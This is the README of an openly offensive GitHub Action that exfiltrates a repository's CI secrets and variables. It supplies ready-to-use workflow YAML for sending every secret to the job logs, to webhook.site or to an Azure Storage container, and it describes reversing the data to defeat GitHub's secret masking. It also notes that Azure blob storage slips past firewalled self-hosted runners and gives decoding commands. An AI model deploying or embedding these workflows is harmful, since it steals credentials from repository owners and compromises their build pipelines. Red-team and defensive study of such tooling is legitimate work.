## Background

All the contexts: https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs
Printing context to logs: https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs#about-contexts

## Usage

### Exfil to GitHub Action logs (default behaviour)

``` yml
on: push

jobs:
  exfil:
    runs-on: ubuntu-latest
    name: This will exfil secrets
    steps:
      - uses: offensive-actions/exfiltrator@main
        with:
          vars: ${{ toJSON(vars) }}
          secrets: ${{ toJSON(secrets) }}
```

### Exfil to webhook.site

``` yml
on: push

jobs:
  exfil:
    runs-on: ubuntu-latest
    name: This will exfil secrets
    steps:
      - uses: offensive-actions/exfiltrator@main
        with:
          vars: ${{ toJSON(vars) }}
          secrets: ${{ toJSON(secrets) }}
          sink: 'webhook.site'
          webhook-site-id: '<site_id>'
```

This allows sending the data off to [https://webhook.site](https://webhook.site).

Going there will automatically generate an ID you can use for the input variable `webhook-site-id`.

> ⚠️ Beware: if you do not use the paid version of the service, the exfiltrated data will be readable for anyone with the correct ID (UUID), and for the owner of the site.

### Exfil to Azure Storage Account container

``` yml
on: push

jobs:
  exfil:
    runs-on: ubuntu-latest
    name: This will exfil secrets
    steps:
      - uses: offensive-actions/exfiltrator@main
        with:
          vars: ${{ toJSON(vars) }}
          secrets: ${{ toJSON(secrets) }}
          sink: 'azure-storage-account'
          az-storage-account-name: '<storage_account_name>'
          az-storage-container-name: '<container_name>'
          az-storage-sas-token: '<sas_token>'
```

This option is available, since `*.blob.core.windows.net` has to be whitelisted even for firewall protected self-hosted runners, since GitHub uses Azure Storage Accounts for writing job summaries, logs, workflow artifacts, and caches (see [documentation](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#communication-between-self-hosted-runners-and-github)).

If your Storage Account has the globally unique name `examplename`, it will be available at `https://examplename.blob.core.windows.net`...

You should generate an SAS token that will allow for write-only for a limited time. This will generate one that is valid for 10 minutes:

``` bash
az storage container generate-sas --account-name <storage_account_name> --name <container_name> --permissions w --expiry $(date -u -d "+10 minutes" +"%Y-%m-%dT%H:%M:%SZ")
```

### Working with the output

The Action will exfiltrate a json that is first reversed character by character (to circumvent the masking of secrets) and then base64 encoded for the transport.

Follow these steps to make this blob readable:

``` bash
# make all of it readable
echo <output> | base64 -d | rev | jq

# show only the envvars that get a special treatment, since they are not in json format to begin with
echo <output> | base64 -d | rev | jq -r '.[0].envvars' | base64 -d
```

## Next steps

Status:
* logs works on all OSs
* Azure storage works only on ubuntu; on windows there are "too many arguements for curl" and on macos there is a weird problem with awk - however, it worked for logs sink, so I dont get it.

1. If exfil fails to webhook or Azure, the action still succeeds, since the HTTP errors are not regarded as errors in general. Change that?
2. Fix Azure exfil for windows and macOS
